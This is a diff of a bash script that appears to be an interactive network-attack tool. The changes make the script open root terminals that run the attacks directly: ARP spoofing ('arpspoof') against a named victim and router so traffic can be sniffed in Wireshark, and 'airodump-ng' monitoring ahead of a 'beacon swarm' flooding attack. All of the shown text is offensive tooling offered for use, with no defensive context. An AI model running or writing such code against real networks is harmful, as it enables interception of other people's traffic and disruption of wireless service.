@@ -96,8 +96,7 @@ then
 		echo "What Is the IP for the router without the /amountOfIPs"
 		read ipn
 		clear
-		echo "Before we continue. Type this command in the new terminal: sudo arpspoof -i $card -t $ipn $victim"
-		gnome-terminal
+		sudo gnome-terminal --command "sudo arpspoof -i $card -t $ipn $victim"
 		echo ""
 		echo "Press enter to move on. When You are ready analyze stuff with wireshark. (It is ran as root just so you know)"
 		read edrfgwsdfghs
@@ -431,7 +430,13 @@ then
 		fi
 	fi
 	echo ""
-	echo "I reccomend monitoring everything by opening another terminal and typing in this command: sudo airodump-ng $card"
+	echo "I reccomend monitoring everything. So do you want to?"
+	read term
+	if [[ $term == "yes" ]]
+	then
+		echo ""
+		sudo gnome-terminal --command "sudo airodump-ng $card"
+	fi
 	echo "Press the enter button to begin beacon swarm. Be careful! If you run it too long it can crash your computer!"
 	read beaconswarmonstart
 	$beacon
